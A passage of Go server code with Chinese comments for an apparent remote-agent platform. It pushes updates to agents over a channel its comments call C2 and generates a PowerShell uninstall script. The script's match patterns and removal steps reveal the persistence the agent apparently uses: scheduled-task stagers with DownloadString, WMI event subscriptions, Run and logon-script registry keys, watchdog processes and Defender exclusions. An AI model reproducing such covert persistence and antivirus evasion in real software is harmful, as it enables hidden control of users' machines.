		c.JSON(http.StatusBadRequest, gin.H{"success": false, "error": fmt.Sprintf("%s Agent 二进制不存在，请先上传", req.Platform)})
		return
	}

	payload, _ := json.Marshal(map[string]string{
		"url": downloadURL,
	})
	msg := ws.AgentMessage{
		Type:    "update",
		ID:      fmt.Sprintf("update-%s-%d", req.Platform, time.Now().UnixMilli()),
		Payload: payload,
	}

	// 同时发送 C2 编码版（新 agent）和明文版（旧 agent）
	// 新 agent 会忽略不认识的明文类型，旧 agent 会忽略不认识的编码类型
	sent := h.agentHub.BroadcastToAgents(msg, req.ServerIDs, req.Platform)
	// 明文版让旧版 agent 也能收到更新指令
	msgPlain := ws.AgentMessage{
		Type:    "update",
		ID:      fmt.Sprintf("update-plain-%s-%d", req.Platform, time.Now().UnixMilli()),
		Payload: payload,
	}
	h.agentHub.BroadcastToAgentsPlain(msgPlain, req.ServerIDs, req.Platform)

	c.JSON(http.StatusOK, gin.H{
		"success": true,
		"data": gin.H{
			"sent":     sent,
			"platform": req.Platform,
		},
	})
}

// CleanupScriptWin 生成 Windows 一键清除 Agent 的 PowerShell 脚本
func (h *AgentUpdateHandler) CleanupScriptWin(c *gin.Context) {
	if !h.blockBrowser(c) {
		return
	}

	script := "$ErrorActionPreference = \"SilentlyContinue\"\r\n"
	script += "Write-Host \"========== Go Agent 一键清除 ==========\" -ForegroundColor Yellow\r\n"
	script += "Write-Host \"\"\r\n"

	// [1] 杀进程
	script += "Write-Host \"[1/7] 杀进程...\" -ForegroundColor Cyan\r\n"
	script += "Get-WmiObject Win32_Process | Where-Object { $_.ExecutablePath -and $_.ExecutablePath -like 'C:\\ProgramData\\*\\*.exe' } | ForEach-Object {\r\n"
	script += "    Write-Host \"  杀掉: PID=$($_.ProcessId) $($_.ExecutablePath)\" -ForegroundColor Red\r\n"
	script += "    Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue\r\n"
	script += "}\r\n"
	script += "Get-Process | Where-Object { $_.Path -like '*ServerMonitorAgent*' } | ForEach-Object {\r\n"
	script += "    Write-Host \"  杀掉旧版: PID=$($_.Id) $($_.Path)\" -ForegroundColor Red\r\n"
	script += "    Stop-Process -Id $_.Id -Force -ErrorAction SilentlyContinue\r\n"
	script += "}\r\n"
	script += "Start-Sleep -Seconds 2\r\n"

	// [2] 移除服务
	script += "Write-Host \"[2/7] 移除服务...\" -ForegroundColor Cyan\r\n"
	script += "Get-WmiObject Win32_Service | Where-Object { $_.PathName -and $_.PathName -like '*ProgramData*' } | ForEach-Object {\r\n"
	script += "    Write-Host \"  删除服务: $($_.Name)\" -ForegroundColor Red\r\n"
	script += "    sc.exe stop $_.Name 2>$null\r\n"
	script += "    sc.exe delete $_.Name 2>$null\r\n"
	script += "}\r\n"

	// [3] 移除计划任务
	script += "Write-Host \"[3/7] 移除计划任务...\" -ForegroundColor Cyan\r\n"
	script += "Get-ScheduledTask -ErrorAction SilentlyContinue | ForEach-Object {\r\n"
	script += "    $task = $_\r\n"
	script += "    foreach ($a in $task.Actions) {\r\n"
	script += "        $exe = $a.Execute; $arg = $a.Arguments\r\n"
	script += "        if ($exe -like '*ProgramData*' -or $arg -like '*ProgramData*' -or $arg -like '*guard-a*' -or $arg -like '*guard-b*' -or $arg -like '*stager*' -or $arg -like '*DownloadString*') {\r\n"
	script += "            Write-Host \"  删除任务: $($task.TaskName)\" -ForegroundColor Red\r\n"
	script += "            Unregister-ScheduledTask -TaskName $task.TaskName -TaskPath $task.TaskPath -Confirm:$false -ErrorAction SilentlyContinue\r\n"
	script += "        }\r\n"
	script += "    }\r\n"
	script += "}\r\n"

	// [4] 移除 WMI
	script += "Write-Host \"[4/7] 移除 WMI 订阅...\" -ForegroundColor Cyan\r\n"
	script += "$ns = 'root\\subscription'\r\n"
	script += "Get-WmiObject -Namespace $ns -Class ActiveScriptEventConsumer -EA SilentlyContinue | ForEach-Object { Write-Host \"  删除: $($_.Name)\" -ForegroundColor Red; $_ | Remove-WmiObject -EA SilentlyContinue }\r\n"
	script += "Get-WmiObject -Namespace $ns -Class CommandLineEventConsumer -EA SilentlyContinue | ForEach-Object { $_ | Remove-WmiObject -EA SilentlyContinue }\r\n"
	script += "Get-WmiObject -Namespace $ns -Class __FilterToConsumerBinding -EA SilentlyContinue | ForEach-Object { $_ | Remove-WmiObject -EA SilentlyContinue }\r\n"
	script += "Get-WmiObject -Namespace $ns -Class __EventFilter -EA SilentlyContinue | Where-Object { $_.Query -like '*Win32_PerfFormattedData*' } | ForEach-Object { $_ | Remove-WmiObject -EA SilentlyContinue }\r\n"

	// [5] 清理注册表
	script += "Write-Host \"[5/7] 清理注册表...\" -ForegroundColor Cyan\r\n"
	script += "$runPath = 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run'\r\n"
	script += "(Get-ItemProperty $runPath -EA SilentlyContinue).PSObject.Properties | Where-Object { $_.Value -like '*ProgramData*' -or $_.Value -like '*powershell*stager*' -or $_.Value -like '*DownloadString*' } | ForEach-Object {\r\n"
	script += "    Write-Host \"  删除 Run 键: $($_.Name)\" -ForegroundColor Red\r\n"
	script += "    Remove-ItemProperty -Path $runPath -Name $_.Name -EA SilentlyContinue\r\n"
	script += "}\r\n"
	script += "$runPathCU = 'HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run'\r\n"
	script += "(Get-ItemProperty $runPathCU -EA SilentlyContinue).PSObject.Properties | Where-Object { $_.Value -like '*ProgramData*' -or $_.Value -like '*powershell*stager*' -or $_.Value -like '*DownloadString*' } | ForEach-Object {\r\n"
	script += "    Write-Host \"  删除 HKCU Run 键: $($_.Name)\" -ForegroundColor Red\r\n"
	script += "    Remove-ItemProperty -Path $runPathCU -Name $_.Name -EA SilentlyContinue\r\n"
	script += "}\r\n"
	script += "$winlogonPath = 'HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon'\r\n"
	script += "$ls = (Get-ItemProperty $winlogonPath -EA SilentlyContinue).UserInitMprLogonScript\r\n"
	script += "if ($ls) { Write-Host \"  删除 UserInitMprLogonScript\" -ForegroundColor Red; Remove-ItemProperty -Path $winlogonPath -Name 'UserInitMprLogonScript' -EA SilentlyContinue }\r\n"

	// [6] 删除文件
	script += "Write-Host \"[6/7] 删除文件...\" -ForegroundColor Cyan\r\n"
	script += "if (Test-Path 'C:\\ProgramData\\ServerMonitorAgent') {\r\n"
	script += "    icacls 'C:\\ProgramData\\ServerMonitorAgent' /reset /T /Q 2>$null\r\n"
	script += "    Remove-Item 'C:\\ProgramData\\ServerMonitorAgent' -Recurse -Force -EA SilentlyContinue\r\n"
	script += "    Write-Host \"  删除: C:\\ProgramData\\ServerMonitorAgent\" -ForegroundColor Red\r\n"
	script += "}\r\n"
	script += "Get-ChildItem 'C:\\ProgramData' -Directory -EA SilentlyContinue | ForEach-Object {\r\n"
	script += "    if (Test-Path (Join-Path $_.FullName 'agent.conf')) {\r\n"
	script += "        Write-Host \"  删除 agent 目录: $($_.FullName)\" -ForegroundColor Red\r\n"
	script += "        icacls $_.FullName /reset /T /Q 2>$null\r\n"
	script += "        Remove-Item $_.FullName -Recurse -Force -EA SilentlyContinue\r\n"
	script += "    }\r\n"
	script += "}\r\n"

	// [7] 清理杀软白名单
	script += "Write-Host \"[7/7] 清理杀软白名单...\" -ForegroundColor Cyan\r\n"
	script += "Get-MpPreference -EA SilentlyContinue | Select-Object -ExpandProperty ExclusionPath -EA SilentlyContinue | Where-Object { $_ -like '*ProgramData*' -and $_ -notlike '*Microsoft*Windows*' } | ForEach-Object {\r\n"
	script += "    Write-Host \"  移除 Defender 排除: $_\" -ForegroundColor Red\r\n"
	script += "    Remove-MpPreference -ExclusionPath $_ -EA SilentlyContinue\r\n"
	script += "}\r\n"

	script += "Write-Host \"\"\r\n"
	script += "Write-Host \"========== 清理完成 ==========\" -ForegroundColor Green\r\n"
	script += "Write-Host \"可以安全重启电脑了。\" -ForegroundColor Green\r\n"

	c.Header("Content-Type", "text/plain; charset=utf-8")
	c.String(http.StatusOK, script)
}
